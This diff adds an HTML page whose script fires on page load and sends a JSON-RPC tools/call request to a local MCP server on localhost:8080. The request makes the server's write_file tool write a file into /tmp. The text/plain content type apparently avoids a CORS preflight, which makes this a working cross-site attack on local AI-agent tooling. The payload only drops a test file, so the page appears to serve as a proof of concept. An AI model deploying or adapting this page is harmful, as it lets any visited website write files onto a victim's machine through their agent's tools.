@@ -1,0 +1,49 @@
+<html>
+<head>
+  <title>Send HTTP Request on Load</title>
+</head>
+<body>
+
+<script>
+  function sendHttpRequest() {
+    const xhr = new XMLHttpRequest();
+    const url = "http://localhost:8080/mcp/message?sessionId=552a1c54-3608-4d12-88ad-12251381d9f1";
+    const payload = JSON.stringify({
+      "jsonrpc": "2.0",
+      "id": 1,
+      "method": "tools/call",
+      "params": {
+        "tool": "write_file",
+        "name": "write_file",
+        "arguments": {
+          "path": "/tmp/this_is_a_test",
+          "content": "This file was dropped onto the filesystem."
+        }
+      }
+    });
+
+    xhr.open("POST", url);
+    xhr.setRequestHeader("Content-Type", "text/plain");
+
+    xhr.onload = function() {
+      if (xhr.status >= 200 && xhr.status < 300) {
+        console.log("Request successful:", xhr.responseText);
+        // You can update the HTML with the response here if needed
+      } else {
+        console.error("Request failed. Returned status of " + xhr.status);
+      }
+    };
+
+    xhr.onerror = function() {
+      console.error("There was a network error.");
+    };
+
+    xhr.send(payload);
+  }
+
+  // Call the function when the page has finished loading
+  window.onload = sendHttpRequest;
+</script>
+
+</body>
+</html>
